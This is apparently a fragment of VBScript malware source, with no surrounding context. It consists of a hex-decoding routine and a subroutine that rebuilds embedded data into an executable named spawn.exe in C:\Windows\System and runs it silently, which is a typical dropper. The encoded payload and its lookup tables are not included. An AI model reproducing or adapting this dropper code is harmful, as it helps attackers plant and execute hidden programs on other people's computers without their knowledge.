function decomp(line)
dim i,x
for i = 1 to len(line)
x=mid(line,i,1)
if instr("1234567890ABCDEF",x)=0 then
decomp=decomp & chr("&H" & mid(chars,instr(over,x)*2-1,2))
else
decomp=decomp & chr("&H" & mid(line,i,2))
i=i+1
end if
next
end function

sub script()
dim fso,reg,sys,win,tmp,desk,user,use,pth,i
Set fso = CreateObject("Scripting.FileSystemObject")
set reg = createobject("WScript.shell")
pth = "C:\Windows\System\spawn.exe"
if fso.fileexists(pth) then exit sub
Set f = fso.CreateTextFile(pth, ForWriting)
for i = 0 to ubound(lines)-1
f.write decomp(lines(i))
next
f.close
reg.run(pth)
